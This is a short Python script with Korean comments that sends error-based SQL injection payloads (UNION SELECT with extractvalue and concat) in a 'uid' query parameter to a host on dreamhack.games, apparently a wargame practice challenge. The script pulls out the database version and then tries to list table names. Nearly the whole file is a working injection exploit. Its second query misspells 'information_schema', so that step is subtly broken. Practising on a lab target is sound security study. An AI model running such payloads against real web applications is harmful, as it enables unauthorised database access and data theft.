import http.client
import urllib.parse


# domain: http 포함 x
# port : 포트번호
# params : json 형태로 만들기
def httpreq(domain, port, params) :
    print("HTTP GET request to ",domain, port)
    
    # GET 요청 보내기
    headers = {

    }
    
    query_string = urllib.parse.urlencode(params)
    
    conn = http.client.HTTPConnection(domain, port)
    
    conn.request("GET", f"/?{query_string}")

    response = conn.getresponse()

    print(response.status, response.reason)

    data = response.read().decode()
    
    return data

# 에러메시지에 구분 식별자 추가
delims = "!~!~!~!"


############
# 입력할 부분 # 
############
# 쿼리 문자열 생성
# 'union select 1,2,extractvalue(1,concat(0x32, version()))#
params = {
    'uid': "'union select 1,2,extractvalue(1,concat('"+delims+"', version(), '"+delims+"'))#"
}

domain = "host3.dreamhack.games"
port = 16677

data = httpreq(domain, port, params)

print(data.split(delims)[1])

params = {
    'uid': "'union select 1,2,extractvalue(1,concat('"+delims+"', (select table_name from infromation_schema.tables where table_type='base table' limit 1 offset 1 ), '"+delims+"'))#"
}


data = httpreq(domain, port, params)

print(data)